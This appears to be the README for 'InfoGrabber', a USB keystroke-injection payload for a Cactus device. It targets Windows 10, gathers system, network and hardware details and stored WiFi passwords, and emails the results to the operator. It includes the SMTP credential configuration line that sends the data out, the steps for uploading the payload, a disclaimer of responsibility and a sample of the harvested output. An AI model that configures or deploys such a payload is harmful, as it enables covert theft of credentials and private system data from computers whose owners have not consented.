Author     : 0rion5 B3lt, (original creator Simen Kjeserud), Gachnang, Dannyk999
Version    : v2.1
Title      : Comprehensive Information Gathering (InfoGrabber)
Target     : Windows 10

Description: Gathers all sorts of information on the target in under 40 seconds. Collects information like OS, Vendor, 
Network Information, Hardware Details, Software Details, Process Details, WIFI passwords, USB device VID & PID, System BIOS Etc...

Requirements: Internet Connection.

Configuration: Input your SMTP info into the QuactusInfoGrabber.txt file. Configure the areas described below;
QuactusInfoGrabber.txt > Line 22:Print:$SMTPServer = 'SMTP.MAIL.COM HERE', $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAILHERE', 'YOURPASSWORD HERE'), & $ReportEmail.From = 'YOUREMAIL HERE'; $ReportEmail.To.Add('YOUREMAIL HERE');

Instructions : 1. Configure the QuactusInfoGrabber.txt with your information
               2. Upload The Payload to the Cactus
               Use at your discretion.
               
Disclaimer : I am in no way responsible for how this payload is used or how others use this payload. reference your local laws & abide them

OUTPUT WILL LOOK SIMILAR TO THIS.
==================================================================
========================BASIC    DETAILS==========================
==================================================================

COMPUTER NAME                 : COMPUTERNAME-PC
==================================================================
Operating System Installed    : Microsoft Windows 10 Pro
Operating System Architecture : 64-bit
Version                       : 10.0.######
Windows Exerience Score       : 5.9
Serial Number                 : #####-#####-#####-#####
Install date                  : 12/19/2018 02:37:08
Last Boot                     : 01/10/2019 11:48:56
Local Time                    : 01/19/2019 15:12:18

SYSTEM PRODUCT DETAILS
==================================================================
Vendor                        : DELL
Model                         : ABC-###
Identifying Number            : ##########
UUID                          : ########-####-####-####-############
Name                          : COMPUTERNAME-PC
PrimaryOwnerName              : JULIA
Domain                        : WORKGROUP
